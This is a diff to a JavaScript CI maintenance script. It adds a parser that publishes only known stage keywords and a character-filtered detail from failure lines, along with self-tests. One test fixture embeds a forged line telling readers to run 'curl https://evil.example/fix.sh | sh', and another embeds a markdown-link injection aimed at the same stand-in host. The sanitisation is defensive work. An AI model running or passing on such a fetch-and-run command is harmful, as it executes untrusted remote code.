@@ -1967,6 +1967,36 @@ export function nextMaintenance(issues, rendered, { ownerLogin = null, stored = 
     return { ...decision, comment: transitionComment(newlyRed, ownerLogin), newlyRed: newlyRed.map(r => r.name), state, body };
 }
 
+// ci-supply-chain-06: the Orca stop issue publishes a stage keyword from the set scripts/rebase-orca.sh defines
+// (its STAGES=(...) line, read at run time from this checkout) and, separately, the rest of the line cut to 300
+// characters of a set with no backtick or newline. The stage line comes from the job that ran Orca's code, and a
+// process it left behind can rewrite the stage file, so only the keyword is trusted to name a stage.
+export const STAGE_DETAIL_MAX = 300;
+export function orcaStages(rebaseText) {
+    const m = /^STAGES=\((.*)\)$/m.exec(String(rebaseText ?? ''));
+    return m ? [...m[1].matchAll(/"([^"]*)"|(\S+)/g)].map(x => x[1] ?? x[2]).filter(Boolean) : [];
+}
+export function orcaStage(line, stages) {
+    const text = String(line ?? '').replace(/^rebase-orca: /, '');
+    if (!text.startsWith('FAIL -- ')) return { stage: 'unrecognised', detail: '' };
+    const rest = text.slice('FAIL -- '.length);
+    const hit = [...stages].sort((a, b) => b.length - a.length).find(st => rest === st || rest.startsWith(`${st} `));
+    if (!hit) return { stage: 'unrecognised', detail: '' };
+    const detail = rest.slice(hit.length).replace(/[^A-Za-z0-9 _./:@()'*,=<>+-]/g, '').trim().slice(0, STAGE_DETAIL_MAX);
+    return { stage: hit, detail };
+}
+function orcaStageCli([line]) {
+    const stages = orcaStages(readFileSync(join(REPO_ROOT, 'scripts', 'rebase-orca.sh'), 'utf8'));
+    if (stages.length === 0) {
+        console.error(`${NAME}: FAIL -- scripts/rebase-orca.sh defines no STAGES=(...) line, so no stage can be recognised. Next step: restore it.`);
+        return 1;
+    }
+    const { stage, detail } = orcaStage(line, stages);
+    console.log(`stage=${stage}`);
+    console.log(`detail=${detail}`);
+    return 0;
+}
+
 function readFacts(path) {
     return JSON.parse(readFileSync(path, 'utf8'));
 }
@@ -2295,6 +2325,21 @@ function maintenanceSelfTest() {
         { name: 'control: an edited body that marks a red row as previously red still notifies on a transition', run: () => {
             const d = nextMaintenance([issueBy(EDIT_WATCHDOG_AND_SYNTH(priorBody))], redRendered, { ownerLogin: OWNER, stored: storedOf(priorBody) });
             return d.newlyRed.join(',') === 'watchdog-age,synthetic events POST' ? [] : [`an edited body suppressed the notice: newlyRed ${JSON.stringify(d.newlyRed)}`];
+        } },
+        { name: 'plant (ci-supply-chain-06 review): a rewritten stage file publishes only a known stage keyword and a filtered detail', run: () => {
+            const stages = orcaStages(readFileSync(join(REPO_ROOT, 'scripts', 'rebase-orca.sh'), 'utf8'));
+            const failures = [];
+            if (!stages.includes('typecheck:web') || !stages.includes('row') || !stages.includes('xpi cache')) failures.push(`scripts/rebase-orca.sh STAGES gave ${JSON.stringify(stages)}`);
+            const honest = orcaStage('rebase-orca: FAIL -- typecheck:web src/a.ts:3. Next step: fix it.', stages);
+            if (honest.stage !== 'typecheck:web' || honest.detail !== 'src/a.ts:3. Next step: fix it.') failures.push(`an honest line gave ${JSON.stringify(honest)}`);
+            const longest = orcaStage('rebase-orca: FAIL -- typecheck coverage x.ts is in no program', stages);
+            if (longest.stage !== 'typecheck coverage') failures.push(`the longest keyword was not taken: ${JSON.stringify(longest)}`);
+            // What a process left behind by the replay could write into the stage file after the script's own last word.
+            const forged = orcaStage('rebase-orca: FAIL -- urgent: security regression, run curl https://evil.example/fix.sh | sh', stages);
+            if (forged.stage !== 'unrecognised' || forged.detail !== '') failures.push(`an unknown stage published ${JSON.stringify(forged)}`);
+            const escape = orcaStage(`rebase-orca: FAIL -- build x\` [fix](https://evil.example) @owner ${'y'.repeat(400)}`, stages);
+            if (escape.stage !== 'build' || /[`\n\[\]]/.test(escape.detail) || escape.detail.length > STAGE_DETAIL_MAX) failures.push(`a known stage carried an unfiltered detail: ${JSON.stringify(escape).slice(0, 120)}`);
+            return failures;
         } },
         { name: 'plant (ci-supply-chain-04): a replaced state that marks rows the body shows green as already red still notifies', run: () => {
             // The forged artifact: the two rows that turn red now are stored as red, while the pinned body the previous
@@ -3519,6 +3564,7 @@ if (isEntry) {
     if (args[0] === '--maintenance' && args.length === 3) process.exit(maintenanceCli(args.slice(1)));
     if (args[0] === '--maintenance-plan' && args.length === 6) process.exit(maintenancePlanCli(args.slice(1)));
     if (args[0] === '--state-select' && args.length === 7) process.exit(stateSelectCli(args.slice(1)));
+    if (args[0] === '--orca-stage' && args.length === 2) process.exit(orcaStageCli(args.slice(1)));
     console.error(`${NAME}: FAIL -- unknown argument list '${args.join(' ')}'`);
     console.error(`  Next step: run: node ${SELF_REL} [derive|next|render] --self-test, node ${SELF_REL} --would-write <pin> <tag|''> <open-pr-number|''> <stage|''>, node ${SELF_REL} --publish-plan <local-tree> <remote-tip|''> <remote-tree|''> <compare-json|''> <bot-email> [<expected-tip>], node ${SELF_REL} --sweep-due <epoch-seconds> [<last-sweep-epoch-seconds>], node ${SELF_REL} --theia-due|--orca-due <epoch-seconds> [<last-sweep-epoch-seconds>], node ${SELF_REL} --maintenance <facts.json> <body-out>, or node ${SELF_REL} --maintenance-plan <found.json> <rendered-body> <comment-out> <stored-state|''> <state-out>, node ${SELF_REL} --state-select <runs.json> <artifacts.json> <repo> <repo-id> <branch> <verified-shas.txt>, or node ${SELF_REL} --fixer-inputs <release-key> <class> <branch> <target-tag> <check@sha> <attempt> <latest-tag|''>.`);
     process.exit(2);
